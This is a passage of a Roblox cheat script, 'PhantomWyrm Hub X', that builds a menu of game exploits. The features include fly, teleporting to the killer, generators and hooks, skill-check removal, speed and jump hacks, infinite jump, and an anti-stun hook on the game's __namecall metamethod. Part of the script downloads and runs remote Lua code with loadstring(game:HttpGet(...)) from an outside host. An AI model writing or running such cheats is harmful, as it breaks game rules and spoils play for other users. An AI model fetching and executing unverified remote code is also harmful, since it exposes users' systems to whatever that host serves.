    Numeric = true,
    Finished = false,
    Callback = function(a)
        local b = tonumber(a) or 0
        if not DFunctions then
            DFunctions = _G.DFunctions or shared.DFunctions
        end                          
        if not _G.DConfiguration then _G.DConfiguration = {} end
        if not _G.DConfiguration.Settings then _G.DConfiguration.Settings = {} end
        if not _G.DConfiguration.Settings.GuiScale then _G.DConfiguration.Settings.GuiScale = {} end                
        local currentScale = b * 0.01
        _G.DConfiguration.Settings.GuiScale.Fly = currentScale
        if DFunctions and typeof(DFunctions.UpdateButton) == "function" then
            DFunctions.UpdateButton("FlyButton", 0.15 + currentScale, 0.1 + currentScale)
        end
    end
})

local FlySpeedInput = Tabs.Main:AddInput("FlySpeedInput", {
    Title = "Fly Speed",
    Default = tostring(_G.flySpeed),
    Placeholder = "Enter fly speed",
    Numeric = true,
    Finished = false,
    Callback = function(Value)
        _G.flySpeed = tonumber(Value) or 20
    end
})

task.spawn(flyLoop)

Tabs.Main:AddSection("Teleport")

Tabs.Main:AddButton({
    Title = "Teleport To lobby",
    Description = "",
    Callback = function()
        if d and d.Character then
            local rootPart = d.Character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                rootPart.CFrame = CFrame.new(1940.67, 736.54, 3814.82)
            end
        end
    end
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function findMapLocation()
    local mapFolder = workspace:FindFirstChild("Map")
    
    if mapFolder then
       
        for _, obj in ipairs(mapFolder:GetDescendants()) do
            if obj:IsA("SpawnLocation") then
                return obj
            end
            if obj:IsA("BasePart") then
                local name = obj.Name:lower()
                if name:find("spawn") or name:find("start") then
                    return obj
                end
            end
        end
        

        for _, obj in ipairs(mapFolder:GetDescendants()) do
            if obj:IsA("BasePart") then
                local name = obj.Name:lower()
                if name:find("floor") or name:find("ground") or name:find("base") or name:find("part") then
                    return obj
                end
            end
        end
        
        local fallbackPart = mapFolder:FindFirstChildOfClass("BasePart") or mapFolder:FindFirstChildWhichIsA("BasePart", true)
        if fallbackPart then
            return fallbackPart
        end
    end
    
    return nil
end



Tabs.Main:AddButton({
    Title = "Teleport to Map",
    Description = "",
    Callback = function()
        local localPlayer = game:GetService("Players").LocalPlayer
        
        if localPlayer and localPlayer.Character then
            local root = localPlayer.Character:FindFirstChild("HumanoidRootPart")
            if root then
               
                local mapFolder = workspace:FindFirstChild("Map", true)
                if mapFolder then
                    
                    local spawnsFolder = mapFolder:FindFirstChild("Spawns")
                    if spawnsFolder then
                   
                        local spawnPoint = spawnsFolder:FindFirstChild("SurvivorSpawn")
                        if spawnPoint and spawnPoint:IsA("BasePart") then
                            root.CFrame = spawnPoint.CFrame * CFrame.new(0, 5, 0)
                        end
                    end
                end
            end
        end
    end
})



Tabs.Main:AddButton({
    Title = "Teleport to Killer",
    Description = "",
    Callback = function()
        if not d or not d.Character then return end
        local myRoot = d.Character:FindFirstChild("HumanoidRootPart")
        if not myRoot then return end

        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
            if player ~= d and player.Character then
                local isKiller = false
                
                if player.Team then
                    local teamName = player.Team.Name:lower()
                    local teamColor = player.Team.TeamColor.Color
                    
                    if teamName:find("kill") or teamName:find("murd") or teamName:find("beast") or teamName:find("monst") or teamName:find("maniac") or teamName:find("hunter") then
                        isKiller = true
                    elseif teamColor.R > 0.7 and teamColor.G < 0.2 and teamColor.B < 0.2 then
                        isKiller = true
                    end
                end

                local roleAttr = player:GetAttribute("Role") or player:GetAttribute("RoleName")
                if roleAttr then
                    local roleStr = tostring(roleAttr):lower()
                    if roleStr:find("kill") or roleStr:find("murd") or roleStr:find("beast") or roleStr:find("monster") or roleStr:find("maniac") then
                        isKiller = true
                    end
                end

                if isKiller then
                    local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                    local targetHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    
                    if targetRoot and (not targetHumanoid or targetHumanoid.Health > 0) then
                        myRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 3, 0)
                        break
                    end
                end
            end
        end
    end
})

Tabs.Main:AddParagraph({
        Title = " ",
        Content = ""
    })

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local generatorsTable = {}
local hooksTable = {}

local function scanMap()
    table.clear(generatorsTable)
    table.clear(hooksTable)
    
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj and obj.Parent then
            local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
            
            if model and model.Name then
                local name = model.Name:lower()
                
                if name:find("generator") or name == "gen" then
                    local isCompleted = model:GetAttribute("Completed") or model:GetAttribute("Activated") or model:GetAttribute("Done")
                    if isCompleted ~= true and not table.find(generatorsTable, model) then
                        table.insert(generatorsTable, model)
                    end
                elseif model.Name == "Hook" and not table.find(hooksTable, model) then
                    table.insert(hooksTable, model)
                end
            end
        end
    end
end


Tabs.Main:AddButton({
    Title = "Teleport to Generator 1",
    Callback = function() scanMap() local t = generatorsTable[1] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Generator 2",
    Callback = function() scanMap() local t = generatorsTable[2] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Generator 3",
    Callback = function() scanMap() local t = generatorsTable[3] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Generator 4",
    Callback = function() scanMap() local t = generatorsTable[4] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Generator 5",
    Callback = function() scanMap() local t = generatorsTable[5] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Generator 6",
    Callback = function() scanMap() local t = generatorsTable[6] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Generator 7",
    Callback = function() scanMap() local t = generatorsTable[7] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddParagraph({
        Title = " ",
        Content = ""
    })

Tabs.Main:AddButton({
    Title = "Teleport to Hook 1",
    Callback = function() scanMap() local t = hooksTable[1] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Hook 2",
    Callback = function() scanMap() local t = hooksTable[2] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Hook 3",
    Callback = function() scanMap() local t = hooksTable[3] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Hook 4",
    Callback = function() scanMap() local t = hooksTable[4] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Hook 5",
    Callback = function() scanMap() local t = hooksTable[5] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Hook 6",
    Callback = function() scanMap() local t = hooksTable[6] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})

Tabs.Main:AddButton({
    Title = "Teleport to Hook 7",
    Callback = function() scanMap() local t = hooksTable[7] if t and t.Parent and LocalPlayer.Character then local r = LocalPlayer.Character:FindFirstChild("HumanoidRootPart") if r then r.CFrame = t:GetPivot() * CFrame.new(0, 3, 0) end end end
})


-- Farm

Tabs.AutoFarm:AddParagraph({
        Title = "Write to Discord what to add here :)",
        Content = ""
    })

-- Combat

local App = {
    Enabled = false
}


local function renameObject(obj)
    if App.Enabled then
        local name = string.lower(obj.Name)
        if name:find("check") or name:find("skill") then
          
            obj.Name = "Disabled_" .. obj.Name
        end
    end
end

game.DescendantAdded:Connect(renameObject)

for _, obj in ipairs(game:GetDescendants()) do
    renameObject(obj)
end

Tabs.Combat:AddToggle("BreakSkillCheckToggle", {
    Title = "Delete Skill Check",
    Default = false,
    Callback = function(state)
        App.Enabled = state
        if state then
            for _, obj in ipairs(game:GetDescendants()) do
                renameObject(obj)
            end
        end
    end
})


Tabs.Combat:AddSection("Gun")

local CoreGui = game:GetService("CoreGui")

local CrosshairData = {
    Enabled = false,
    ImageID = "rbxassetid://128452847009449",
    Size = 40,
    OffsetX = 0,
    OffsetY = 0
}

local CrosshairGui = Instance.new("ScreenGui")
CrosshairGui.Name = "CenterCrosshairGui"
CrosshairGui.ResetOnSpawn = false
CrosshairGui.IgnoreGuiInset = true
CrosshairGui.Enabled = false
CrosshairGui.Parent = CoreGui

local CrosshairImage = Instance.new("ImageLabel")
CrosshairImage.Name = "Crosshair"
CrosshairImage.Parent = CrosshairGui
CrosshairImage.BackgroundTransparency = 1
CrosshairImage.Image = CrosshairData.ImageID
CrosshairImage.AnchorPoint = Vector2.new(0.5, 0.5)

local function UpdateCrosshair()
    CrosshairImage.Size = UDim2.new(0, CrosshairData.Size, 0, CrosshairData.Size)
    CrosshairImage.Position = UDim2.new(0.5, CrosshairData.OffsetX, 0.5, CrosshairData.OffsetY)
end

UpdateCrosshair()

Tabs.Combat:AddToggle("CenterCrosshair", {
    Title = "Custom Crosshair",
    Description = "",
    Default = false,
    Callback = function(State)
        CrosshairData.Enabled = State
        CrosshairGui.Enabled = State
    end
})

Tabs.Combat:AddButton({
    Title = "Reset Crosshair",
    Callback = function()
        CrosshairData.Size = 40
        CrosshairData.OffsetX = 0
        CrosshairData.OffsetY = 0
        
        SizeSlider:SetValue(40)
        XSlider:SetValue(0)
        YSlider:SetValue(0)
        
        UpdateCrosshair()
    end
})

local SizeSlider = Tabs.Combat:AddSlider("CrosshairSize", {
    Title = "Size",
    Min = 10,
    Max = 100,
    Default = 40,
    Rounding = 0,
    Callback = function(Value)
        CrosshairData.Size = Value
        UpdateCrosshair()
    end
})

local XSlider = Tabs.Combat:AddSlider("CrosshairX", {
    Title = "X",
    Min = -200,
    Max = 200,
    Default = 0,
    Rounding = 0,
    Callback = function(Value)
        CrosshairData.OffsetX = Value
        UpdateCrosshair()
    end
})

local YSlider = Tabs.Combat:AddSlider("CrosshairY", {
    Title = "Y",
    Min = -200,
    Max = 200,
    Default = 0,
    Rounding = 0,
    Callback = function(Value)
        CrosshairData.OffsetY = Value
        UpdateCrosshair()
    end
})

Tabs.Combat:AddParagraph({
        Title = "Write to Discord what to add here :)",
        Content = ""
    })

-- Misc

Tabs.Misc:AddSection("Player Adjustments")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local TargetWalkSpeed = 16
local TargetJumpPower = 50
local TargetTPWalk = 1

Tabs.Misc:AddInput("WalkSpeedInput", {
    Title = "Player Speed",
    Default = "16",
    Placeholder = "Number",
    Numeric = true,
    Finished = true,
    Callback = function(Value)
        TargetWalkSpeed = tonumber(Value) or 16
    end
})

Tabs.Misc:AddInput("JumpPowerInput", {
    Title = "Player Jump",
    Default = "50",
    Placeholder = "Number",
    Numeric = true,
    Finished = true,
    Callback = function(Value)
        TargetJumpPower = tonumber(Value) or 50
    end
})

Tabs.Misc:AddInput("TPWalkInput", {
    Title = "WalkSpeed",
    Default = "1",
    Placeholder = "Number",
    Numeric = true,
    Finished = true,
    Callback = function(Value)
        TargetTPWalk = tonumber(Value) or 1
    end
})


RunService.RenderStepped:Connect(function(dt)
    if LocalPlayer.Character then
        local character = LocalPlayer.Character
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        
        if humanoid then
            local isStunned = character:GetAttribute("Stunned") or character:GetAttribute("IsStunned") or character:GetAttribute("Frozen")
            
            if not isStunned and humanoid.PlatformStand == false then
                if humanoid.WalkSpeed ~= TargetWalkSpeed then
                    humanoid.WalkSpeed = TargetWalkSpeed
                end
                
                humanoid.UseJumpPower = true
                if humanoid.JumpPower ~= TargetJumpPower then
                    humanoid.JumpPower = TargetJumpPower
                end
                
                if TargetTPWalk > 1 and rootPart and humanoid.MoveDirection.Magnitude > 0 then
                    rootPart.CFrame = rootPart.CFrame + (humanoid.MoveDirection * (humanoid.WalkSpeed * (TargetTPWalk - 1)) * dt)
                end
            end
        end
    end
end)


local Players = game:GetService("Players")
local d = Players.LocalPlayer
while not d do
    task.wait(0.1)
    d = Players.LocalPlayer
end

local playerGui = d:WaitForChild("PlayerGui", 15)
if playerGui then
    _G.JumpButtonEnabled = false

    local function forceJumpButtonState()
        local touchGui = playerGui:FindFirstChild("TouchGui")
        local touchFrame = touchGui and touchGui:FindFirstChild("TouchControlFrame")
        local jumpButton = touchFrame and touchFrame:FindFirstChild("JumpButton")
        if jumpButton then
            jumpButton.Visible = _G.JumpButtonEnabled
        end
    end

    if Tabs and Tabs.Misc then
        Tabs.Misc:AddParagraph({
        Title = " ",
        Content = ""
    })

local UserInputService = game:GetService("UserInputService")
local InfiniteJumpEnabled = false

Tabs.Misc:AddToggle("InfiniteJumpToggle", {
    Title = "Infinite Jump",
    Default = false,
    Callback = function(state)
        InfiniteJumpEnabled = state
    end
})

UserInputService.JumpRequest:Connect(function()
    if InfiniteJumpEnabled then
        local char = LocalPlayer.Character
        if char then
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
end)


        Tabs.Misc:AddToggle(
            "JumpButtonToggle",
            {
                Title = "Show Jump Button",
                Default = false,
                Callback = function(state)
                    _G.JumpButtonEnabled = state
                    forceJumpButtonState()
                end
            }
        )
    end

    task.spawn(function()
        forceJumpButtonState()
        playerGui.DescendantAdded:Connect(function(descendant)
            if descendant.Name == "JumpButton" then
                task.wait()
                descendant.Visible = _G.JumpButtonEnabled
            end
        end)
        while task.wait(0.3) do
            forceJumpButtonState()
        end
    end)
end

local DashButtonToggle = Tabs.Misc:AddToggle("DashButtonToggle", {Title = "Dash (Button)", Default = false})

local isDashing = false

DashButtonToggle:OnChanged(function(State)
    if not DFunctions then DFunctions = _G.DFunctions or shared.DFunctions end

    if State then
        local currentScale = (DConfiguration and DConfiguration.Settings and DConfiguration.Settings.GuiScale and DConfiguration.Settings.GuiScale.Dash) or 0
        
        DFunctions.CreateButton("DashButton", "Dash", 0.15 + currentScale, 0.1 + currentScale, function(btn)
            if isDashing then return end

            local camLook = camera.CFrame.LookVector
            if camLook.Y < 0 then
                return
            end

            local char = localPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            
            if root then
                isDashing = true
                btn.Text = "Dashing..."

                local dashDirection = camLook.Unit
                local dashVelocity = dashDirection * 120

                root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)

                local attachment = Instance.new("Attachment", root)
                local linearVelocity = Instance.new("LinearVelocity", root)
                
                linearVelocity.Attachment0 = attachment
                linearVelocity.MaxForce = math.huge
                linearVelocity.VectorVelocity = dashVelocity
                
                task.wait(0.15)
                
                linearVelocity:Destroy()
                attachment:Destroy()

                local timeLeft = 3
                while timeLeft > 0 do
                    btn.Text = "COOLDOWN "..timeLeft.."s"
                    task.wait(1)
                    timeLeft -= 1
                end

                isDashing = false
                btn.Text = "Dash"
            end
        end)
    else
        if DFunctions and typeof(DFunctions.DestroyButton) == "function" then
            DFunctions.DestroyButton("DashButton")
        end
    end
end)

Tabs.Misc:AddInput("DashButtonSize", {
    Title = "Dash Gui Size",
    Default = tostring((_G.DConfiguration and _G.DConfiguration.Settings and _G.DConfiguration.Settings.GuiScale and _G.DConfiguration.Settings.GuiScale.Dash) and (_G.DConfiguration.Settings.GuiScale.Dash / 0.01) or 0),
    Placeholder = "0",
    Numeric = true,
    Finished = false,
    Callback = function(a)
        local b = tonumber(a) or 0
        if not DFunctions then
            DFunctions = _G.DFunctions or shared.DFunctions
        end                          
        if not _G.DConfiguration then _G.DConfiguration = {} end
        if not _G.DConfiguration.Settings then _G.DConfiguration.Settings = {} end
        if not _G.DConfiguration.Settings.GuiScale then _G.DConfiguration.Settings.GuiScale = {} end                
        local currentScale = b * 0.01
        _G.DConfiguration.Settings.GuiScale.Dash = currentScale
        if DFunctions and typeof(DFunctions.UpdateButton) == "function" then
            DFunctions.UpdateButton("DashButton", 0.15 + currentScale, 0.1 + currentScale)
        end
    end
})

Tabs.Misc:AddParagraph({
        Title = " ",
        Content = ""
    })

do
	local __lt = (function()
		local globalEnv = (getgenv and getgenv()) or _G or {};
		local sharedEnv = rawget(_G, "shared");
		local cacheHost = type(sharedEnv) == "table" and sharedEnv or (type(globalEnv) == "table" and globalEnv or nil);
		if cacheHost then
			local cached = rawget(cacheHost, "__lt_service_resolver");
			if type(cached) == "table" then
				return cached;
			end;
		end;
		local loader = loadstring or load;
		if type(loader) ~= "function" then
			error("Service resolver loader unavailable");
		end;
		local resolver = loader(game:HttpGet("https://ltseverydayyou.github.io/ServiceResolver.luau"), "@ServiceResolver.luau");
		if type(resolver) ~= "function" then
			error("Service resolver failed to compile");
		end;
		local loaded = resolver();
		if type(loaded) ~= "table" then
			error("Service resolver failed to load");
		end;
		if cacheHost then
			cacheHost.__lt_service_resolver = loaded;
		end;
		return loaded;
	end)();

	local __NAUIProtector = (function()
		local globalEnv = (getgenv and getgenv()) or _G or {};
		local sharedEnv = rawget(_G, "shared");
		local cacheHost = type(sharedEnv) == "table" and sharedEnv or (type(globalEnv) == "table" and globalEnv or nil);
		if cacheHost then
			local cached = rawget(cacheHost, "__lt_ui_protector");
			if type(cached) == "table" then
				return cached;
			end;
		end;
		local loader = loadstring or load;
		if type(loader) ~= "function" then
			return nil;
		end;
		local okSource, source = pcall(function()
			return game:HttpGet("https://ltseverydayyou.github.io/UIprotector.luau");
		end);
		if not okSource or type(source) ~= "string" or source == "" then
			return nil;
		end;
		local chunk = loader(source, "@UIprotector.luau");
		if type(chunk) ~= "function" then
			return nil;
		end;
		local okLoaded, loaded = pcall(chunk);
		if okLoaded and type(loaded) == "table" then
			if cacheHost then
				cacheHost.__lt_ui_protector = loaded;
			end;
			return loaded;
		end;
		return nil;
	end)();

	local __NAOriginalGetHui = gethui;
	local gethui = function()
		if __NAUIProtector and type(__NAUIProtector.huiGrabber) == "function" then
			local ok, ui = pcall(__NAUIProtector.huiGrabber);
			if ok and typeof(ui) == "Instance" then
				return ui;
			end;
		end;
		if type(__NAOriginalGetHui) == "function" then
			local ok, ui = pcall(__NAOriginalGetHui);
			if ok then
				return ui;
			end;
		end;
		return nil;
	end;

	local function __NAProtectUI(gui, options)
		if __NAUIProtector and type(__NAUIProtector.protectUI) == "function" then
			local ok, protected = pcall(__NAUIProtector.protectUI, gui, options);
			if ok and protected then
				return protected;
			end;
		end;
		return nil;
	end;

	local ref = cloneref or function(x)
		return x;
	end;

	local S = function(n)
		return __lt.cs(n, ref);
	end;

	local Plrs, Tw, UIS, RS, Wk, CG = S("Players"), S("TweenService"), S("UserInputService"), S("RunService"), S("Workspace"), S("CoreGui");
	local plr = Plrs.LocalPlayer;

	local function getParts()
		local c = plr.Character or plr.CharacterAdded:Wait();
		local hum, hrp;
		for _, d in c:QueryDescendants("Instance") do
			if not hum and d:IsA("Humanoid") then
				hum = d;
			end;
			if not hrp and d:IsA("BasePart") and d.Name == "HumanoidRootPart" then
				hrp = d;
			end;
			if hum and hrp then
				break;
			end;
		end;
		hum = hum or c:WaitForChild("Humanoid");
		hrp = hrp or c:WaitForChild("HumanoidRootPart");
		return c, hum, hrp;
	end;

	local _G = _G or {};
	_G.ShiftLock = false;

	local function updateShiftLock()
		if not _G.ShiftLock then
			return;
		end;
		local _, hum, hrp = getParts();
		local cam = Wk.CurrentCamera;
		if UIS.MouseEnabled and UIS.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
			UIS.MouseBehavior = Enum.MouseBehavior.LockCenter;
		end;
		if hum and hum.AutoRotate then
			hum.AutoRotate = false;
		end;
		if hrp and cam then
			local lv = cam.CFrame.LookVector;
			local flat = Vector3.new(lv.X, 0, lv.Z);
			if flat.Magnitude > 0.0001 then
				hrp.CFrame = CFrame.lookAt(hrp.Position, hrp.Position + flat.Unit, Vector3.yAxis);
			end;
		end;
	end;

	local camTypeCon;
	local function toggleSystem(v)
		pcall(function()
			RS:UnbindFromRenderStep("AbsoluteShiftLock");
		end);
		if camTypeCon then
			camTypeCon:Disconnect();
			camTypeCon = nil;
		end;
		if v then
			RS:BindToRenderStep("AbsoluteShiftLock", Enum.RenderPriority.Camera.Value + 1, updateShiftLock);
			local cam = Wk.CurrentCamera;
			if cam then
				camTypeCon = cam:GetPropertyChangedSignal("CameraType"):Connect(function()
					if _G.ShiftLock then
						task.wait();
						pcall(function()
							RS:UnbindFromRenderStep("AbsoluteShiftLock");
						end);
						RS:BindToRenderStep("AbsoluteShiftLock", Enum.RenderPriority.Camera.Value + 1, updateShiftLock);
					end;
				end);
			end;
		else
			if UIS.MouseEnabled then
				UIS.MouseBehavior = Enum.MouseBehavior.Default;
			end;
			local _, hum, _ = getParts();
			if hum then
				hum.AutoRotate = true;
			end;
		end;
	end;

	local SimpleShiftLockToggle = Tabs.Misc:AddToggle("SimpleShiftLockToggle", {Title = "Enable ShiftLock", Default = false})

	SimpleShiftLockToggle:OnChanged(function(State)
		_G.ShiftLock = State;
		toggleSystem(State);
	end)

	local ShiftLockToggle = Tabs.Misc:AddToggle("ShiftLockToggle", {Title = "ShiftLock (Button)", Default = false})

	ShiftLockToggle:OnChanged(function(State)
		if not DFunctions then 
			DFunctions = _G.DFunctions or shared.DFunctions 
		end

		if State then
			local currentScale = (DConfiguration and DConfiguration.Settings and DConfiguration.Settings.GuiScale and DConfiguration.Settings.GuiScale.ShiftLock) or 0
			
			if DFunctions and typeof(DFunctions.CreateButton) == "function" then
				DFunctions.CreateButton("ShiftLockButton", "ShiftLock: OFF", 0.15 + currentScale, 0.1 + currentScale, function(btn)
					_G.ShiftLock = not _G.ShiftLock
					toggleSystem(_G.ShiftLock)
					
					if _G.ShiftLock then
						btn.Text = "ShiftLock: ON"
					else
						btn.Text = "ShiftLock: OFF"
					end
				end)
			else
				warn("DFunctions.CreateButton не найдена!")
			end
		else
			if DFunctions and typeof(DFunctions.DestroyButton) == "function" then
				DFunctions.DestroyButton("ShiftLockButton")
			end
			_G.ShiftLock = false;
			toggleSystem(false);
		end
	end)

	Tabs.Misc:AddInput("ShiftLockSize", {
		Title = "ShiftLock Gui Size",
		Default = tostring((_G.DConfiguration and _G.DConfiguration.Settings and _G.DConfiguration.Settings.GuiScale and _G.DConfiguration.Settings.GuiScale.ShiftLock) and (_G.DConfiguration.Settings.GuiScale.ShiftLock / 0.01) or 0),
		Placeholder = "0",
		Numeric = true,
		Finished = false,
		Callback = function(a)
			local b = tonumber(a) or 0
			if not DFunctions then
				DFunctions = _G.DFunctions or shared.DFunctions
			end                          
			if not _G.DConfiguration then _G.DConfiguration = {} end
			if not _G.DConfiguration.Settings then _G.DConfiguration.Settings = {} end
			if not _G.DConfiguration.Settings.GuiScale then _G.DConfiguration.Settings.GuiScale = {} end                
			local currentScale = b * 0.01
			_G.DConfiguration.Settings.GuiScale.ShiftLock = currentScale
			if DFunctions and typeof(DFunctions.UpdateButton) == "function" then
				DFunctions.UpdateButton("ShiftLockButton", 0.15 + currentScale, 0.1 + currentScale)
			end
		end
	})

	plr.CharacterAdded:Connect(function()
		task.wait(0.2);
		toggleSystem(_G.ShiftLock or false);
	end);

	local lastCam = Wk.CurrentCamera;
	Wk:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
		local c = Wk.CurrentCamera;
		if c ~= lastCam then
			lastCam = c;
			toggleSystem(_G.ShiftLock or false);
		end;
	end);
end

Tabs.Misc:AddParagraph({
        Title = " ",
        Content = ""
    })
    
_G.AntiStunActive = false
local StunRemoteName = "ApplyStun" 

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    
    if _G.AntiStunActive and method == "FireClient" and self.Name == StunRemoteName then
        return nil 
    end
    
    return oldNamecall(self, ...)
end)

Tabs.Misc:AddToggle("AntiStunToggle", {
    Title = "Anti Stun",
    Default = false,
    Callback = function(Value)
        _G.AntiStunActive = Value
    end
})


task.spawn(function()
    while true do
        if _G.AntiStunActive then
            local char = game:GetService("Players").LocalPlayer.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum then
                if hum.PlatformStand then hum.PlatformStand = false end
                if hum.Sit then hum.Sit = false end
                local root = char:FindFirstChild("HumanoidRootPart")
                if root and root.Anchored then root.Anchored = false end
            end
        end
        task.wait(0.1)
    end
end)


Tabs.Misc:AddSection("Camera Adjustment")

local wyrm_fov = 70

getgenv().WyrmResolution = {
    ["Aori_Stretch"] = 1
}

Tabs.Misc:AddInput("FOV_Val", {
    Title = "FOV", 
    Default = "70", 
    Callback = function(v) 
        local num = tonumber(v)
        if num then
            wyrm_fov = num 
        end
    end
})

Tabs.Misc:AddInput("Res_Val", {
    Title = "Stretch Res",
    Default = "1",
    Callback = function(v)
        local num = tonumber(v)
        if num then
            getgenv().WyrmResolution["Aori_Stretch"] = num
        end
    end
})

if getgenv().gg_scripters_unique == nil then
    game:GetService("RunService"):BindToRenderStep("AoriCameraStretchFix", Enum.RenderPriority.Camera.Value + 1, function()
        local independentCam = workspace.CurrentCamera
        if independentCam then
            independentCam.FieldOfView = wyrm_fov
            
            local wyrm_res = getgenv().WyrmResolution["Aori_Stretch"]
            if wyrm_res and wyrm_res ~= 1 then
                independentCam.CFrame = independentCam.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, wyrm_res, 0, 0, 0, 1)
            end
        end
    end)
end
getgenv().gg_scripters_unique = true
getgenv().gg_scripters = "Aori0001"

_G.CameraOffsetX = 0
_G.CameraOffsetY = 0
_G.CameraOffsetZ = 0

function UpdateThirdpersonCameraOffset()
    local player = game:GetService("Players").LocalPlayer
    if player and player.Character then
        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.CameraOffset = Vector3.new(_G.CameraOffsetX, _G.CameraOffsetY, _G.CameraOffsetZ)
        end
    end
end

Tabs.Misc:AddToggle("ThirdpersonToggle", {
    Title = "Killer ThirdPerson",
    Description = "",
    Default = false,
    Callback = function(state)
        local player = game:GetService("Players").LocalPlayer
        if state then
            player.CameraMaxZoomDistance = 128
            player.CameraMinZoomDistance = 10
            UpdateThirdpersonCameraOffset()
        else
            player.CameraMaxZoomDistance = 12.5
            player.CameraMinZoomDistance = 0.5
            if player.Character then
                local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.CameraOffset = Vector3.new(0, 0, 0)
                end
            end
        end
    end
})

Tabs.Misc:AddSlider("CameraX", {
    Title = "Camera X",
    Description = "",
    Default = 0,
    Min = -20,
    Max = 20,
    Rounding = 1,
    Callback = function(Value)
        _G.CameraOffsetX = Value
        UpdateThirdpersonCameraOffset()
    end
})

Tabs.Misc:AddSlider("CameraY", {
    Title = "Camera Y",
    Description = "",
    Default = 0,
    Min = -20,
    Max = 20,
    Rounding = 1,
    Callback = function(Value)
        _G.CameraOffsetY = Value
        UpdateThirdpersonCameraOffset()
    end
})

Tabs.Misc:AddSlider("CameraZ", {
    Title = "Camera Z",
    Description = "",
    Default = 0,
    Min = -20,
    Max = 20,
    Rounding = 1,
    Callback = function(Value)
        _G.CameraOffsetZ = Value
        UpdateThirdpersonCameraOffset()
    end
})

Tabs.Misc:AddParagraph({
        Title = "Write to Discord what to add here :)",
        Content = ""
    })

-- Visual

Tabs.Visual:AddParagraph({
        Title = "Write to Discord what to add here :)",
        Content = ""
    })

-- info

Tabs.Info:AddButton({
    Title = "Discord Server",
    Description = "Click to copy link",
    Callback = function()
        setclipboard("https://discord.gg/NZneWgcckM")
    end
})

Tabs.Info:AddParagraph({
    Title = "PhantomWyrm-Hub-X",
    Content = "Made By Carey"
})

Tabs.Info:AddParagraph({
    Title = "PhantomWyrm Hub X Mobile",
    Content = "Made by Carey"
})

Tabs.Info:AddParagraph({
    Title = "Fluent UI",
    Content = "By dawid-scripts"
})


Tabs.Extension:AddSection("Character Extension")

_G.KorbloxR_Enabled = false
_G.KorbloxL_Enabled = false
_G.Headless_Enabled = false

local Players = game:GetService("Players")
local player = Players.LocalPlayer


local function applyKorblox(side, meshId)
